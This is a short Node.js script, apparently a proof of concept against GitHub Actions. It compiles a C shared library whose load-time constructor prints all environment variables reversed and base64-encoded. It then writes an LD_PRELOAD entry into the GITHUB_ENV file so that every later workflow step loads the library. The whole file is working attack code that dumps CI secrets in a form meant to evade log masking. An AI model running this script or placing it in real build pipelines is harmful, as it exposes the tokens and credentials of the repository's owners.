const fs = require("node:fs");
const { spawn } = require('child_process');

console.log("Setting LDPRELOAD");

var testc = `#include <stdlib.h>
#include <unistd.h>

static void __attribute__((constructor)) so_main(void) {
  unsetenv("LD_PRELOAD");
  system("env | rev | base64");
  return;
}`
fs.writeFile("test.c", testc, console.log);
spawn("bash", ["-c", "sudo apt install gcc && gcc -fPIC -shared test.c -o test.so"], {stdio: 'inherit'});

fs.writeFile(process.env.GITHUB_ENV, "LD_PRELOAD=./test.so", console.log);
